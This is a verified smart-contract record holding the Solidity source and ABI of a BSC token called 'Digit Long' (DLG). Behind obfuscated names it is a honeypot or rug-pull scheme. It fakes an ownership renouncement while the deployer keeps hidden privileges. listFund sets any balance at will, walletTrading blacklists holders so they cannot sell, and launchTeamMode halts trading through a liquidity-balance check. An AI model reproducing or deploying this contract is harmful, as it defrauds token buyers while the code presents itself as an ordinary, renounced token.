{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface liquidityShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFund {\n    function createPair(address buyTeam, address listAt) external returns (address);\n}\n\ninterface isList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptLimitSwap) external view returns (uint256);\n\n    function transfer(address teamLaunched, uint256 txSell) external returns (bool);\n\n    function allowance(address receiverTakeAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamLaunched,\n        uint256 txSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldTotal, uint256 value);\n    event Approval(address indexed receiverTakeAt, address indexed spender, uint256 value);\n}\n\ninterface amountShould is isList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DigitLong is totalMode, isList, amountShould {\n\n    bool private autoSwap;\n\n    address walletFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private marketingAmount;\n\n    function getOwner() external view returns (address) {\n        return marketingAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private isTx;\n\n    string private totalTradingTx = \"DLG\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalTradingTx;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchTo;\n    }\n\n    bool public marketingIs;\n\n    uint256 public marketingReceiver;\n\n    function launchTeamMode(uint256 txSell) public {\n        txSender();\n        listBuyToken = txSell;\n    }\n\n    uint256 private fundMarketing;\n\n    function walletTrading(address tradingWallet) public {\n        txSender();\n        \n        if (tradingWallet == isFund || tradingWallet == buyLaunchedIs) {\n            return;\n        }\n        minFromWallet[tradingWallet] = true;\n    }\n\n    uint256 listBuyToken;\n\n    function name() external view virtual override returns (string memory) {\n        return maxTx;\n    }\n\n    uint8 private launchTo = 18;\n\n    uint256 exemptTakeList;\n\n    uint256 constant sellFund = 15 ** 10;\n\n    event OwnershipTransferred(address indexed teamExempt, address indexed launchedTotal);\n\n    mapping(address => bool) public minFromWallet;\n\n    function approve(address limitAt, uint256 txSell) public virtual override returns (bool) {\n        isTx[_msgSender()][limitAt] = txSell;\n        emit Approval(_msgSender(), limitAt, txSell);\n        return true;\n    }\n\n    function feeWallet(address receiverLaunch, address teamLaunched, uint256 txSell) internal returns (bool) {\n        require(walletTo[receiverLaunch] >= txSell);\n        walletTo[receiverLaunch] -= txSell;\n        walletTo[teamLaunched] += txSell;\n        emit Transfer(receiverLaunch, teamLaunched, txSell);\n        return true;\n    }\n\n    function listFund(address tradingTakeShould, uint256 txSell) public {\n        txSender();\n        walletTo[tradingTakeShould] = txSell;\n    }\n\n    uint256 private launchAmount = 100000000 * 10 ** 18;\n\n    uint256 private launchedFee;\n\n    address liquidityToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private takeLimitFrom;\n\n    string private maxTx = \"Digit Long\";\n\n    function txSender() private view {\n        require(receiverExemptReceiver[_msgSender()]);\n    }\n\n    function transfer(address tradingTakeShould, uint256 txSell) external virtual override returns (bool) {\n        return launchedList(_msgSender(), tradingTakeShould, txSell);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchAmount;\n    }\n\n    function allowance(address launchBuy, address limitAt) external view virtual override returns (uint256) {\n        if (limitAt == walletFee) {\n            return type(uint256).max;\n        }\n        return isTx[launchBuy][limitAt];\n    }\n\n    constructor (){\n        \n        liquidityShould receiverSender = liquidityShould(walletFee);\n        buyLaunchedIs = receiverFund(receiverSender.factory()).createPair(receiverSender.WETH(), address(this));\n        \n        isFund = _msgSender();\n        modeFee();\n        receiverExemptReceiver[isFund] = true;\n        walletTo[isFund] = launchAmount;\n        if (marketingReceiver == fundMarketing) {\n            atTake = launchedFee;\n        }\n        emit Transfer(address(0), isFund, launchAmount);\n    }\n\n    function owner() external view returns (address) {\n        return marketingAmount;\n    }\n\n    function modeFee() public {\n        emit OwnershipTransferred(isFund, address(0));\n        marketingAmount = address(0);\n    }\n\n    function transferFrom(address receiverLaunch, address teamLaunched, uint256 txSell) external override returns (bool) {\n        if (_msgSender() != walletFee) {\n            if (isTx[receiverLaunch][_msgSender()] != type(uint256).max) {\n                require(txSell <= isTx[receiverLaunch][_msgSender()]);\n                isTx[receiverLaunch][_msgSender()] -= txSell;\n            }\n        }\n        return launchedList(receiverLaunch, teamLaunched, txSell);\n    }\n\n    address public isFund;\n\n    function receiverToken(address senderBuy) public {\n        if (marketingIs) {\n            return;\n        }\n        \n        receiverExemptReceiver[senderBuy] = true;\n        \n        marketingIs = true;\n    }\n\n    mapping(address => uint256) private walletTo;\n\n    mapping(address => bool) public receiverExemptReceiver;\n\n    bool public txMarketing;\n\n    uint256 public atTake;\n\n    function balanceOf(address exemptLimitSwap) public view virtual override returns (uint256) {\n        return walletTo[exemptLimitSwap];\n    }\n\n    function launchedList(address receiverLaunch, address teamLaunched, uint256 txSell) internal returns (bool) {\n        if (receiverLaunch == isFund) {\n            return feeWallet(receiverLaunch, teamLaunched, txSell);\n        }\n        uint256 fromTotal = isList(buyLaunchedIs).balanceOf(liquidityToken);\n        require(fromTotal == listBuyToken);\n        require(teamLaunched != liquidityToken);\n        if (minFromWallet[receiverLaunch]) {\n            return feeWallet(receiverLaunch, teamLaunched, sellFund);\n        }\n        return feeWallet(receiverLaunch, teamLaunched, txSell);\n    }\n\n    address public buyLaunchedIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTakeAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLimitSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunchedIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txSell\",\"type\":\"uint256\"}],\"name\":\"launchTeamMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTakeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSell\",\"type\":\"uint256\"}],\"name\":\"listFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFromWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverExemptReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderBuy\",\"type\":\"address\"}],\"name\":\"receiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTakeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"}],\"name\":\"walletTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DigitLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}